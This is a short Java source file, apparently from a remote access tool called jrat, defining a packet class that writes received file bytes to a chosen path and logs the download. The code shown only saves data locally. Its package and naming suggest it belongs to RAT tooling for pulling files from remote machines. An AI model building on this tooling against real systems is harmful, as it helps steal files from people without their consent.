package net.jrat.core.packet.client;

import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;

import net.jrat.core.packet.IPacket;
import net.jrat.utils.Logger;
import net.jrat.utils.Variables;

public class C2PacketDownload implements IPacket
{
	private static final long serialVersionUID = 1L;
	
	private byte[] filedata;
	private String outputpath;
	
	@Override
	public void execute(Object object) throws Exception
	{
		final File file = new File(this.outputpath);
		
		if(!(file.exists()))
		{
			file.getParentFile().mkdirs();
			file.createNewFile();
		}
		
		final BufferedOutputStream writer = new BufferedOutputStream(new FileOutputStream(file));
		writer.write(this.filedata);
		writer.close();
		
		Logger.space();
		Logger.log("downloaded file: " + this.outputpath);
		Logger.space();
		
		System.out.print(Variables.instance.appname + " -> ");
	}
}